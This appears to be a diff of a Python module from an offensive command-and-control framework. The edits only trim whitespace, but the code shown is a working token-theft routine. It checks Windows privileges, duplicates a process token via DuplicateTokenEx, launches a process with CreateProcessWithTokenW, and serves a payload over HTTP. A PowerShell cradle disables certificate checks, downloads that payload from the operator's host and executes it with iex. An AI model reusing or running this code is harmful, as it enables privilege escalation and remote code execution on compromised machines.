@@ -209,10 +209,10 @@ global page_count
 			print(brightred + f"[!] Failed to open local file {args.output}: {e}")
 
 		print(brightgreen + f"[+] Payload written to {args.output}")
-		
+
 
 	priv_check = '''$ErrorActionPreference='Continue'; $reqs=@('SeDebugPrivilege','SeImpersonatePrivilege','SeAssignPrimaryTokenPrivilege'); $have=whoami /priv|Select-String 'Enabled'|%{($_ -split '\\s+')[0]}; $ok=$true; foreach($r in $reqs){ if($have -contains $r){ Write-Output "HAS $r" } else { Write-Output "MISSING $r"; $ok=$false } }; if($ok){ Write-Output 'SUCCESS' }'''
-	
+
 	sess = session_manager.sessions[sid]
 	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
 
@@ -232,7 +232,7 @@ global page_count
 	if "MISSING SeAssignPrimaryTokenPrivilege" in out and "MISSING SeDebugPrivilege" not in out and "MISSING SeImpersonatePrivilege" not in out:
 		print(brightred + f"[*] Agent {display} is missing SeAssignPrimaryTokenPrivilege privilege.")
 		try:
-			while True: 
+			while True:
 				questioncmd = input(brightyellow + f"Is the process {opts.pid} running as SYSTEM or has SeAssignPrimaryTokenPrivilege Y/n? ").strip()
 
 				if not questioncmd:
@@ -399,8 +399,8 @@ if (-not [NativeMethods]::DuplicateTokenEx(
 		$orig,
 		[NativeMethods]::TOKEN_ALL_ACCESS,
 		[IntPtr]::Zero,
-		2,              
-		1,              
+		2,
+		1,
 		[ref]$dup
 	 )) {{
 	Write-Error "DuplicateTokenEx failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
@@ -439,7 +439,7 @@ $success = [NativeMethods]::CreateProcessWithTokenW(
 if (-not $success) {{
 	$err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 	Write-Error "CreateProcessWithTokenW failed: $err"
-	
+
 }}'''
 
 	# HTTP server handler
@@ -475,7 +475,7 @@ if (-not $success) {{
 	server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
 	server_thread.start()
 
-	
+
 	ps_cmd = (
 		"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls;"
 		"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };"
@@ -484,18 +484,18 @@ if (-not $success) {{
 		f"$s = $wc.DownloadString('{prefix}://{opts.local_host}:{opts.http_port}/winprcrpu');"
 		"iex $s"
 		)
-	
-	
+
+
 	try:
 		result = _do_steal_and_launch(sid, opts.pid, ps_cmd, op_id=op_id)
 		page_count = 2
-		
+
 
 		return result
 
 	finally:
 		if page_count == 2:
-			httpd.shutdown() 
+			httpd.shutdown()
 			httpd.server_close()
 			server_thread.join()
 			page_count = 0
